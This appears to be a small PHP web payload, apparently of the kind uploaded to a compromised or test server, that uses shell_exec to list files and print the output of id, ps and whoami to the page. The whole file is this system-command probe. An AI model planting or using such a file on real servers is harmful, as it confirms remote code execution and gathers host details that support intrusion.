<?php
        echo 'php files: ' . shell_exec("ls .");
        echo '<br>';
        echo 'id: ' . shell_exec("id");
        echo '<br>';
        echo 'processes running: ' . shell_exec('ps');
        echo '<br>';
        echo 'whoami?: ' . shell_exec('whoami');
    ?>